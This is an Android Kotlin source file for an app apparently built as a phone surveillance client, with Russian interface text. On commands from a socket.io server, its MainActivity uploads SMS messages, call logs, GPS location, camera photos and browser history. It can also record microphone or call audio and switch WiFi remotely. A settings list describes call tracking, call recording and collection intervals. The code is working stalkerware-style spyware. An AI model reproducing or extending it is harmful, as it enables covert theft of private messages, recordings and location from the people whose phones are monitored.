package zoomapps.mobileoko.activity

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.net.Uri
import android.os.Bundle
import com.arellomobile.mvp.MvpAppCompatActivity
import com.arellomobile.mvp.presenter.InjectPresenter
import android.widget.Toast
import com.github.nkzawa.socketio.client.IO
import org.json.JSONObject
import android.net.wifi.WifiManager
import android.os.Environment
import android.support.v7.widget.LinearLayoutManager
import android.util.Log
import broadcast.MyAppReciever
import com.github.nkzawa.emitter.Emitter.Listener
import kotlinx.android.synthetic.main.activity_main.*
import me.everything.providers.android.browser.BrowserProvider
import me.everything.providers.android.telephony.TelephonyProvider
import mvp.model.GlobalModel
import mvp.presenter.GlobarPresenter
import mvp.view.GlobarView
import me.everything.providers.android.calllog.CallsProvider
import me.everything.providers.android.media.MediaProvider
import mvp.model.ModelSetting
import permissions.dispatcher.*
import zoomapps.mobileoko.R
import zoomapps.mobileoko.adapters.SettingAdapter

import zoomapps.mobileoko.service.CallPhoneService
import zoomapps.mobileoko.service.ConstantService
import zoomapps.mobileoko.service.MyBroadCastReceiver
import zoomapps.mobileoko.service.USSDService
import java.io.File
import java.io.IOException
import java.util.*

@RuntimePermissions
class MainActivity : MvpAppCompatActivity(), GlobarView {
    override fun responseUploadGlobar(responseHistoryBrowserModel: GlobalModel) {
        if (responseHistoryBrowserModel.code == 200) {
            Toast.makeText(this, "Вы успешно загрузили историю браузера", Toast.LENGTH_LONG).show()
        }
    }

    override fun errorUploadGlobar(error: String) {
        Toast.makeText(this, "Ошибка при загрузке", Toast.LENGTH_LONG).show()
        Log.e("error", error)
    }

    @OnPermissionDenied(Manifest.permission.WRITE_CALL_LOG, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAPTURE_AUDIO_OUTPUT, Manifest.permission.CALL_PHONE

    )
    fun onCameraDenied() {

    }

    @OnShowRationale(Manifest.permission.WRITE_CALL_LOG, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAPTURE_AUDIO_OUTPUT,Manifest.permission.CALL_PHONE, Manifest.permission.BIND_ACCESSIBILITY_SERVICE
    )
    fun showRationaleForCamera(request: PermissionRequest) {

    }

    @OnNeverAskAgain(Manifest.permission.WRITE_CALL_LOG, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAPTURE_AUDIO_OUTPUT, Manifest.permission.CALL_PHONE, Manifest.permission.BIND_ACCESSIBILITY_SERVICE
    )
    fun onCameraNeverAskAgain() {

    }

    @NeedsPermission(Manifest.permission.WRITE_CALL_LOG, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAPTURE_AUDIO_OUTPUT, Manifest.permission.CALL_PHONE, Manifest.permission.BIND_ACCESSIBILITY_SERVICE
    )
    fun showContacts() {

    }

    override fun onStart() {
        super.onStart()
        stopService(Intent(this, CallPhoneService::class.java))
    }

    @InjectPresenter
    internal lateinit var globarPresenter: GlobarPresenter
    val BOOKMARKS_URI = Uri.parse("content://browser/bookmarks")
    var telephonyProvider: TelephonyProvider? = null
    var callsProvider: CallsProvider? = null
    var mediaProvader: MediaProvider? = null
    var mRecorder = MediaRecorder()
    var checkMediaRecorder: Boolean = true
    var wifiManajer: WifiManager? = null
    val setting: ArrayList<ModelSetting> = ArrayList()
    var settingAdapter:SettingAdapter? = null
    var mSocket = IO.socket("http://192.168.1.5:3000")


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
       // inializeBroadCastReciver()
        showContactsWithPermissionCheck()
        settingList()
        recyclerViewSetting.layoutManager = LinearLayoutManager(this)
        settingAdapter = SettingAdapter(setting)
        recyclerViewSetting.adapter = settingAdapter
        wifiManajer = this.getApplicationContext().getSystemService(Context.WIFI_SERVICE) as WifiManager
        //inializeCallRecorder()
        mSocket.connect()
        mSocket.on("wifi_on".toString(), emmitWifi)
        mSocket.on("history_browser".toString(), emminBrower)
        mSocket.on("smsInbox".toString(), emmitSmsInbox)
        mSocket.on("phone".toString(), emmitPhone)
        mSocket.on("location".toString(), emmitLocation)
        mSocket.on("recorder".toString(), emmitRecorder)
        mSocket.on("images".toString(), emmitImages)
        mSocket.on("smsOutbox".toString(), emmitSmsOutbox)
        mSocket.on("recorderCall".toString(), emmitRecorderCall)

        startService(Intent(this, USSDService::class.java))
        //dailNumber("*124102*214214#")

//



        val browserProvider = BrowserProvider(this)
        callsProvider = CallsProvider(this)
        telephonyProvider = TelephonyProvider(this)
        mediaProvader = MediaProvider(this)


    }


    var emmitWifi = Listener { array ->
        val message = array[0] as JSONObject
        runOnUiThread {
            if (message.getString("wifi") == "on") {
                Toast.makeText(this, "wifi on", Toast.LENGTH_LONG).show()
                wifiManajer?.setWifiEnabled(true)
            } else if (message.getString("wifi") == "off") {
                Toast.makeText(this, "wifi off", Toast.LENGTH_LONG).show()
                wifiManajer?.setWifiEnabled(false)

            }

        }
    }

    override fun onStop() {
        super.onStop()
        val serviceIntent = Intent(this, CallPhoneService::class.java)
        startService(serviceIntent)
    }

//    private fun dailNumber(code: String) {
//        val ussdCode = "*" + code + Uri.encode("#")
//        startActivity(Intent("android.intent.action.CALL", Uri.parse("tel:$ussdCode")))
//    }

    val emminBrower = Listener { array ->
        runOnUiThread {
            globarPresenter.uploadHistoryBrowser("123", "")
        }

    }

    val emmitSmsInbox = Listener {
        runOnUiThread {
            val mutableList: MutableList<String> = mutableListOf()
            telephonyProvider!!.getSms(TelephonyProvider.Filter.INBOX).list.forEach { v ->
                mutableList.add(v.body + "\n")
            }
            globarPresenter.uploadSmsInbox("123", mutableList)
        }
    }


    val emmitSmsOutbox = Listener {
        runOnUiThread {
            val mutableList: MutableList<String> = mutableListOf()
            telephonyProvider!!.getSms(TelephonyProvider.Filter.SENT).list.forEach { v ->
                mutableList.add(v.body)

            }
            Log.e("outbox", "${telephonyProvider!!.getSms(TelephonyProvider.Filter.SENT).list.size}")
            globarPresenter.uploadSmsOutbox("123", mutableList)
        }
    }

    val emmitPhone = Listener {
        runOnUiThread {
            val mutableList: MutableList<String> = mutableListOf()
            callsProvider!!.calls.list.forEach { v ->
                mutableList.add("${v.number}\n")
            }
            globarPresenter.uploadPhone("123", mutableList)

        }
    }

    @SuppressLint("MissingPermission")
    val emmitLocation = Listener {
        var mLocationManager: LocationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        runOnUiThread {
            val mLocationListener = object : LocationListener {
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
                }

                override fun onProviderEnabled(provider: String?) {
                }

                override fun onProviderDisabled(provider: String?) {
                }

                override fun onLocationChanged(location: Location) {
                    globarPresenter.uploadLocation("123", location.latitude, location.longitude)
                }
            }
            mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000,
                    1000f, mLocationListener)

        }
    }

    var emmitRecorder = Listener { array ->
        val message = array[0] as JSONObject
        runOnUiThread {
            if (message.getString("recorder") == "start") {

                startRecording(MediaRecorder.AudioSource.MIC, "${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath}/${message.getString("path")}/${Date().time}.mp3")
                Log.e("start", "start")
            } else if (message.getString("recorder") == "stop") {
                stopRecording()
                // val path = "${externalCacheDir.absolutePath}/"
                val directory = File("${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath}/dirName")
                val files = directory.listFiles()
                globarPresenter.uploadRecorder("files", files)
                Log.e("start", directory.path)
            }


        }
    }


    var emmitRecorderCall = Listener { array ->
        val message = array[0] as JSONObject
        runOnUiThread {
            if (message.getString("recorder") == "start") {
                startRecording(MediaRecorder.AudioSource.VOICE_COMMUNICATION, "${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath}/${message.getString("path")}/${Date().time}.mp3")
                //startRecording(MediaRecorder.AudioSource.VOICE_CALL)
                Log.e("start", "${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath}/${message.getString("path")}/${Date().time}.mp3")

            } else if (message.getString("recorder") == "stop") {
                stopRecording()
                val directory = File("${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath}/dirName")
                // val path = "${externalCacheDir.absolutePath}/"
                //val directory = File(path)
                val files = directory.listFiles()
                globarPresenter.uploadRecorder("files", files)
                Log.e("start", directory.path)
            }


        }
    }

    val emmitImages = Listener {
        runOnUiThread {

            val path = "${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath}/Camera/"
            val directory = File(path)
            val files = directory.listFiles()
            globarPresenter.uploadImages("123", files)
            //globarPresenter.uploadImages("123", mediaProvader!!.getImages(MediaProvider.Storage.INTERNAL).list)


        }
    }


    var emmitCreateFolders = Listener { array ->
        runOnUiThread {
            val message = array[0] as JSONObject
            val dir = File("${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath}", message.getString("nameFolder"))

            try {
                if (dir.mkdir()) {
                    Toast.makeText(this, "Вы успешно создали каталог", Toast.LENGTH_LONG).show()
                } else {
                    Toast.makeText(this, "Ошибка при создании каталога ${message.getString("nameFolder")}", Toast.LENGTH_LONG).show()
                    Log.e("scsc", "${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath}/directory")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }

        }
    }

    var clockStartApp = Listener {
        runOnUiThread {
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
//            val futureDate = Date(Date().getTime() + 86400000)
//            futureDate.hours = 8
//            futureDate.minutes= 0
//            futureDate.setSeconds(0)
            val intent = Intent(this@MainActivity, MyAppReciever::class.java)
            val sender = PendingIntent.getBroadcast(this@MainActivity, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
            am.set(AlarmManager.RTC_WAKEUP, 10, sender)
        }
    }


    @SuppressLint("NeedOnRequestPermissionsResult")
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        onRequestPermissionsResult(requestCode, grantResults)
    }

    private fun startRecording(typeCall: Int, path: String) {

        if (checkMediaRecorder) {
            mRecorder.setAudioSource(typeCall)
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            //  mRecorder.setOutputFile(filenameInialize())
            mRecorder.setOutputFile(path)
            try {
                mRecorder.prepare()
            } catch (e: IOException) {
                Log.e("errorPrepare", "prepare() failed")
            }
            mRecorder.start()
            Toast.makeText(this, "запись", Toast.LENGTH_LONG).show()
        } else {
            Toast.makeText(this, "Уже идет запись", Toast.LENGTH_LONG).show()
        }
        checkMediaRecorder = false
    }


    private fun stopRecording() {
        if (!checkMediaRecorder) {
            mRecorder.stop()
            mRecorder.release()
            Toast.makeText(this, "Запись останвлена", Toast.LENGTH_LONG).show()
            checkMediaRecorder = true
        } else {
            Toast.makeText(this, "Запись уже останвлена", Toast.LENGTH_LONG).show()
        }
    }

    private fun filenameInialize(): String {
        var mils = Date().time
        var finaName = externalCacheDir.absolutePath
        finaName += "/${mils}.mp3"
        //finaName += "/123.mp3"
        return finaName
    }

    fun playStart() {
        try {
            var mediaPlayer = MediaPlayer()
            mediaPlayer.setDataSource(filenameInialize())
            mediaPlayer.prepare()
            mediaPlayer.start()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun inializeBroadCastReciver() {
        val intentFilter = IntentFilter()
        intentFilter.addAction(ConstantService.BROADCAST_ACTION)
        val myBroadCastReceiver = MyBroadCastReceiver()
        //registerReceiver(myBroadCastReceiver, intentFilter)
    }

    fun settingList() {
        setting.add(ModelSetting(0, "Сервис запущен", "Отметьте, чтобы запустить сервис и уберите отметку, чтобы остановить его"))
        setting.add(ModelSetting(2, "Защита"))
        setting.add(ModelSetting(3, "Частота загрузки данных", "30мин"))
        setting.add(ModelSetting(3, "Диагностика"))
        setting.add(ModelSetting(3, "Загрузить данные", "30 мин"))
        setting.add(ModelSetting(1, "Отслеживание звонков"))
        setting.add(ModelSetting(3, "Частота сбора координат", "10 мин"))
        setting.add(ModelSetting(0, "Входящие SMS"))
        setting.add(ModelSetting(0, "Исходящие SMS"))
        setting.add(ModelSetting(0, "Запись входящих звонков"))
        setting.add(ModelSetting(0, "Запись исходящих звонков "))
        setting.add(ModelSetting(1, "Дополнительно"))
        setting.add(ModelSetting(0, "Загружать адресную книгу"))
        setting.add(ModelSetting(0, "Загружать MMS"))
        setting.add(ModelSetting(0, "Загружать историю браузера"))
        setting.add(ModelSetting(0, "Загружать фото"))
        setting.add(ModelSetting(0, "Включить мобильный интернет"))
        setting.add(ModelSetting(0, "Использовать только WIFI"))
        setting.add(ModelSetting(0, "Интернет в роуминге"))
        setting.add(ModelSetting(0, "В блоке отслеживание координат."))
        setting.add(ModelSetting(0, "Включить сбор данных"))
        setting.add(ModelSetting(0, "Частота сбора данных"))
        setting.add(ModelSetting(0, "GPS координаты"))
        settingAdapter?.notifyDataSetChanged()
    }
}



